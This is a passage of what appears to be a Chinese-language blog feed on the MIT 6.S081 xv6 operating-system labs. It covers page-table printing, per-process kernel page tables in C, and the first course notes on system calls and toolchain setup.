class="number">-1</span>;</span><br><span class="line">info.freemem = getFreememory();</span><br><span class="line">info.nproc = processNum();</span><br><span class="line"><span class="keyword">if</span> (copyout(p-&gt;pagetable, addr, (<span class="keyword">char</span> *)&amp;info, <span class="keyword">sizeof</span>(info)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure><img src="/2022/07/10/2022-7-10-oslab/image-20220720142621715.png" alt="image-20220720142621715"><figcaption aria-hidden="true">image-20220720142621715</figcaption></figure><h1 id="lab3">Lab3</h1><blockquote><p>指导书：https://pdos.csail.mit.edu/6.828/2020/labs/pgtbl.html</p></blockquote><h2 id="print-a-page-table">Print a page table</h2><p>打印页表的一些信息，用来帮助调试的。</p><blockquote><p>Define a function called <code>vmprint()</code>. It should take a <code>pagetable_t</code> argument, and print that pagetable in the format described below. Insert <code>if(p-&gt;pid==1) vmprint(p-&gt;pagetable)</code> in exec.c just before the <code>return argc</code>, to print the first process's page table. You receive full credit for this assignment if you pass the <code>pte printout</code> test of <code>make grade</code>.</p></blockquote><blockquote><p>第一行显示vmprint的参数。之后，每个PTE都有一行，包括引用树中更深的页-表-页的PTE。每个PTE行由若干“.”缩进这表明它在树中的深度。每个PTE行显示其页面表页面中的PTE索引、PTE位和从PTE提取的物理地址。不要打印无效的PTE。在上例中，顶级页面table页面具有条目0和255的映射。条目0的下一级仅映射了索引0，该索引0的底层映射了条目0、1和2。</p></blockquote><ul><li><p><code>defs.c</code>中加vmprint定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmprint</span><span class="params">(<span class="keyword">pagetable_t</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p><code>kernel/exec.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exec.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">  vmprint(p-&gt;pagetable); <span class="comment">// 按照实验要求，在 exec 返回之前打印一下页表。</span></span><br><span class="line">  <span class="keyword">return</span> argc; <span class="comment">// this ends up in a0, the first argument to main(argc, argv)</span></span><br></pre></td></tr></table></figure></li><li><p>在<code>kernel/vm.c</code>中写<code>vmprint()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmprintwalk</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, <span class="keyword">int</span> deep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 2^9 PTEs in a page table</span></span><br><span class="line"><span class="keyword">pte_t</span> pte = pagetable[i];</span><br><span class="line"><span class="keyword">if</span> (pte &amp; PTE_V)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= deep; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;.. &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d: pte %p pa %p\n&quot;</span>, i, pte, PTE2PA(pte));</span><br><span class="line"><span class="keyword">if</span> ((pte &amp; (PTE_R | PTE_W | PTE_X)) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// this PTE points to a lower-level page table.</span></span><br><span class="line">uint64 child = PTE2PA(pte);</span><br><span class="line">vmprintwalk((<span class="keyword">pagetable_t</span>)child, deep + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmprint</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>, pagetable);</span><br><span class="line">vmprintwalk(pagetable, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure><img src="/2022/07/10/2022-7-10-oslab/image-20220721150757704.png" alt="image-20220721150757704"><figcaption aria-hidden="true">image-20220721150757704</figcaption></figure><h2 id="a-kernel-page-table-per-process">A kernel page table per process</h2><blockquote><p>Xv6有一个单独的内核页表，每当它在内核中执行时都会使用它。内核页表是物理地址的直接映射，因此内核虚拟地址x映射到物理地址x。Xv6还为每个进程的用户地址空间提供了一个单独的页表，仅包含该进程用户内存的映射，从虚拟地址零开始。因为内核页表不包含这些映射，所以用户地址在内核中无效。因此，当内核需要使用在系统调用中传递的用户指针（例如，传递给write()的缓冲区指针）时，内核必须首先将指针转换为物理地址。本节和下一节的目标是允许内核直接解引用用户指针。</p><p>您的第一项工作是修改内核，使每个进程在内核中执行时都使用自己的内核页表副本。修改struct proc以维护每个进程的内核页表，并修改调度器以在切换进程时切换内核页表。对于这一步，每个进程内核页表应该与现有的全局内核页表相同。如果usertests运行正确，则通过这部分实验室。</p></blockquote><p>本 Lab 目标是让每一个进程进入内核态后，都能有自己的独立<strong>内核页表</strong>，为第三个实验做准备。</p><ul><li><p>在进程结构体proc中加kernelpgtbl字段，用于存储进程专享的内核态页表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.h</span></span><br><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span> <span class="comment">// Process state</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>  <span class="comment">// Parent process</span></span><br><span class="line">  <span class="keyword">void</span> *chan;           <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="keyword">int</span> killed;           <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="keyword">int</span> xstate;           <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="keyword">int</span> pid;              <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> kernelPageTable; <span class="comment">// Kernel page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>之后是初始化这个<code>kernelPageTable</code>字段，仿<code>kernel/vm.c</code>里<code>kvminit</code>函数，用内核自己pagetable初始化的方式初始化用户进程的<code>kernel pagetable</code>，其中<code>uvmmap</code>类似于<code>kvmmap</code>，只不过<code>kvmmap</code>是直接对全局的<code>kernel_pagetable</code>进行<code>mappage</code>，而<code>uvmmap</code>并没有指定page table</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pagetable_t</span> <span class="title">proc_kvminit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// kernel_pagetable = (pagetable_t)kalloc();</span></span><br><span class="line"><span class="comment">// memset(kernel_pagetable, 0, PGSIZE);</span></span><br><span class="line"><span class="keyword">pagetable_t</span> kernelPageTable;</span><br><span class="line">kernelPageTable = uvmcreate();</span><br><span class="line"><span class="keyword">if</span> (kernelPageTable == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">uvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">uvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">uvmmap(CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line">uvmmap(PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line">uvmmap(KERNBASE, KERNBASE, (uint64)etext - KERNBASE, PTE_R | PTE_X);</span><br><span class="line">uvmmap((uint64)etext, (uint64)etext, PHYSTOP - (uint64)etext, PTE_R | PTE_W);</span><br><span class="line">uvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line"><span class="keyword">return</span> kernelPageTable;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uvmmap</span><span class="params">(uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (mappages(kernel_pagetable, va, sz, pa, perm) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;uvmmap&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在defs.h加声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pagetable_t</span>     <span class="title">proc_kvminit</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>在<code>kernel/proc.c</code>中的<code>allocproc</code>函数中添加调用<code>proc_kvminit()</code>的代码段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;kernelPageTable = proc_kvminit();</span><br><span class="line"><span class="keyword">if</span> (p-&gt;kernelPageTable == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">freeproc(p);</span><br><span class="line">release(&amp;p-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>接下来是初始化内核栈，内核栈的初始化原来是在 <code>kernel/proc.c</code> 中的 <code>procinit</code> 函数内，这部分要求将函数内的代码转移到 <code>allocproc</code> 函数内，因此在上一步初始化内核态页表的代码下面接着添加初始化内核栈的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;kernelPageTable = proc_kvminit();</span><br><span class="line"><span class="keyword">if</span> (p-&gt;kernelPageTable == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">freeproc(p);</span><br><span class="line">release(&amp;p-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 初始化内核栈</span></span><br><span class="line"><span class="keyword">char</span> *pa = kalloc();</span><br><span class="line"><span class="keyword">if</span> (pa == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kalloc&quot;</span>);</span><br><span class="line">uint64 va = KSTACK((<span class="keyword">int</span>)(p - proc));</span><br><span class="line">uvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">p-&gt;kstack = va;</span><br></pre></td></tr></table></figure></li><li><p>进程调度时，切换内核页：内核页的管理使用的是 SATP 寄存器，在 <code>kernel/proc.c</code> 的调度函数 <code>scheduler</code> 中添加切换 SATP 寄存器的代码，并在调度后切换回来, <code>w_satp()</code> 函数用于设置最高级页目录地址的寄存器 SATP, <code>sfence_vam()</code> 用于清空当前 TLB.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// change satp</span></span><br><span class="line">w_satp(MAKE_SATP(p-&gt;kernelPageTable));</span><br><span class="line">sfence_vma();</span><br><span class="line"><span class="comment">// change process</span></span><br><span class="line">swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"><span class="comment">// change back</span></span><br><span class="line">kvminithart();</span><br></pre></td></tr></table></figure></li><li><p>释放内核页表：直接遍历所有的页表，释放所有有效的页表项即可。仿照 <code>freewalk</code> 函数。仅释放页表的映射关系即可，不能将真实的物理地址也释放了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc_freewalk</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// there are 2^9 = 512 PTEs in a page table.</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">pte_t</span> pte = pagetable[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pte &amp; PTE_V)</span><br><span class="line">&#123;</span><br><span class="line">pagetable[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ((pte &amp; PTE_V) &amp;&amp; (pte &amp; (PTE_R | PTE_W | PTE_X)) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// this PTE points to a lower-level page table.</span></span><br><span class="line">uint64 child = PTE2PA(pte);</span><br><span class="line">proc_freewalk((<span class="keyword">pagetable_t</span>)child);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kfree((<span class="keyword">void</span> *)pagetable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>freeproc()</code> 代码如下, 还需注意的一点是, 内核栈 <code>p-&gt;stack</code> 需要在内核页表 <code>p-&gt;kpagetable</code> 之前清除.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">freeproc</span><span class="params">(struct proc *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;trapframe)</span><br><span class="line">kfree((<span class="keyword">void</span> *)p-&gt;trapframe);</span><br><span class="line">p-&gt;trapframe = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;pagetable)</span><br><span class="line">proc_freepagetable(p-&gt;pagetable, p-&gt;sz);</span><br><span class="line">p-&gt;pagetable = <span class="number">0</span>;</span><br><span class="line">p-&gt;sz = <span class="number">0</span>;</span><br><span class="line">p-&gt;pid = <span class="number">0</span>;</span><br><span class="line">p-&gt;parent = <span class="number">0</span>;</span><br><span class="line">p-&gt;name[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p-&gt;chan = <span class="number">0</span>;</span><br><span class="line">p-&gt;killed = <span class="number">0</span>;</span><br><span class="line">p-&gt;xstate = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// free kernel stack</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;kstack)</span><br><span class="line">uvmunmap(p-&gt;kernelPageTable, p-&gt;kstack, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">p-&gt;kstack = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;kernelPageTable)</span><br><span class="line">proc_freewalk(p-&gt;kernelPageTable);</span><br><span class="line">p-&gt;kernelPageTable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">p-&gt;state = UNUSED;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>在 vm.c 中添加头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;proc.h&quot;</span></span></span><br></pre></td></tr></table></figure></li><li><p><code>kvmpa()</code> 函数用于将内核虚拟地址转换为物理地址, 其中调用 <code>walk()</code> 函数时使用了全局的内核页表. 此时需要换位当前进程的内核页表.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">kvmpa</span><span class="params">(uint64 va)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">uint64 off = va % PGSIZE;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line">uint64 pa;</span><br><span class="line"></span><br><span class="line">pte = walk(myproc()-&gt;kernelPageTable, va, <span class="number">0</span>);<span class="comment">//here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pte == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kvmpa&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kvmpa&quot;</span>);</span><br><span class="line">pa = PTE2PA(*pte);</span><br><span class="line"><span class="keyword">return</span> pa + off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写oslab的一些代码，&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xv6中文文档：https://th0ar.gitbooks.io/xv6-chinese/content/content/chapter2.html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;[to</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="OS" scheme="https://ghostasky.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.S081_Note</title>
    <link href="https://ghostasky.github.io/2022/07/07/6.s081/"/>
    <id>https://ghostasky.github.io/2022/07/07/6.s081/</id>
    <published>2022-07-06T16:00:00.000Z</published>
    <updated>2022-07-21T06:01:55.089Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><blockquote><p>6.s081看的是文档（比较快些），没看视频，：https://github.com/Ghostasky/MIT6.S081</p><p>XV6:https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf</p></blockquote><p>有一说一，这课是真他娘好看，就按照章节顺序来做笔记吧。</p><blockquote><p>上次没看完，，，这个暑假搞完，，，，</p></blockquote><h1 id="chapter1">Chapter1</h1><h2 id="s081">6.s081</h2><p>操作系统的目标：</p><ol type="1"><li>抽象硬件(Abstraction)。对CPU，内存这些，使用应用程序实现高层级的接口和抽象，例如进程，文件系统。</li><li>多个应用程序之间共用硬件资源(multiplex)。</li><li>隔离性(Isolation)：多个程序之间互不干扰</li><li>共享(Sharing)：数据交互，协同完成任务等</li><li>Security(或者Permission System或者是Access Control System)</li><li>高性能(Performance)</li><li>支持大量不同类型的程序</li></ol><h3 id="操作系统结构">操作系统结构</h3><p>在这门课程中，我们主要关注点在Kernel、连接Kernel和用户空间程序的接口、Kernel内软件的架构；会关心Kernel中的服务，其中一个服务是文件系统，另一个就是进程管理系统。</p><p>每一个用户空间程序都被称为一个进程，它们有自己的内存和共享的CPU时间。</p><p>应用程序是与Kernel交互通过系统调用实现。</p><p><code>fork()：创建了一个与调用进程一模一样的新的进程，并返回新进程的process ID/pid</code></p><p>当程序员在写普通的应用程序时，应用程序下面都是操作系统。而当我们在构建操作系统时，在操作系统下面就是硬件了，这些硬件通常会更难处理。在这门课程中，我们会使用一个叫做QEMU的硬件模拟器，来模拟CPU和计算机。</p><h3 id="readwriteexit系统调用">read,write,exit系统调用</h3><p>以下都使用XV6，XV6运行在一个RISC-V微处理器上，会在一个QEMU模拟器上运行XV6。</p><p>首先是copy程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n = read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        write(<span class="number">1</span>, buf, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意在Makefile里面：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">$U/_cat\</span><br><span class="line">$U/_echo\</span><br><span class="line">$U/_forktest\</span><br><span class="line">$U/_grep\</span><br><span class="line">$U/_init\</span><br><span class="line">$U/_kill\</span><br><span class="line">$U/_ln\</span><br><span class="line">$U/_ls\</span><br><span class="line">$U/_mkdir\</span><br><span class="line">$U/_rm\</span><br><span class="line">$U/_sh\</span><br><span class="line">$U/_stressfs\</span><br><span class="line">$U/_usertests\</span><br><span class="line">$U/_grind\</span><br><span class="line">$U/_wc\</span><br><span class="line">$U/_zombie\</span><br><span class="line">$U/_copy</span><br></pre></td></tr></table></figure><p>read系统调用：</p><ol type="1"><li>第一个参数为文件描述符，文件描述符0连接到console的输入，文件描述符1连接到了console的输出。</li><li>第二个参数是指向某段内存的指针</li><li>第三个参数是代码想读取的最大长度</li></ol><p>grep x会搜索输入中包含x的行，我可以告诉shell将输入重定向到文件out，这样我们就可以查看out中的x。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ grep a &lt;out</span><br><span class="line">xargstest.sh   2 3 93</span><br><span class="line">cat            2 4 23968</span><br></pre></td></tr></table></figure><h3 id="环境搭建">环境搭建：</h3><p>依据官网：https://pdos.csail.mit.edu/6.828/2020/tools.html</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu</span><br><span class="line">sudo apt-get remove qemu-system-misc</span><br><span class="line">sudo apt-get install qemu-system-misc=1:4.2-3ubuntu6</span><br><span class="line">git <span class="built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2020</span><br><span class="line"><span class="built_in">cd</span> xv6-labs-2020</span><br><span class="line">git checkout util</span><br><span class="line">sudo make qemu</span><br></pre></td></tr></table></figure><p>test:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>:</span><br><span class="line">$ riscv64-unknown-elf-gcc --version</span><br><span class="line">riscv64-unknown-elf-gcc (GCC) 10.1.0</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ qemu-system-riscv64 --version</span><br><span class="line">QEMU emulator version 5.1.0</span><br><span class="line"><span class="comment"># 